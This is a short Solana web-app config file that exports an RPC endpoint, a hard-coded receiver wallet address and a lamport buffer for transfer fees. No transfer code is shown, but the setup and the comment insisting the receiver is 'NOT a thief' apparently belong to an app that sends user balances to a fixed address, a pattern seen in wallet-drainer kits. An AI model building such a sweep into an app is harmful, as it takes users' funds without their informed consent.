import { PublicKey } from '@solana/web3.js';

// 🔑 Replace with your actual Syndica API key or use public RPC
export const RPC_URL = import.meta.env.VITE_RPC_URL || 'https://api.mainnet-beta.solana.com';

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Optional: Minimum balance buffer (in lamports)
export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL
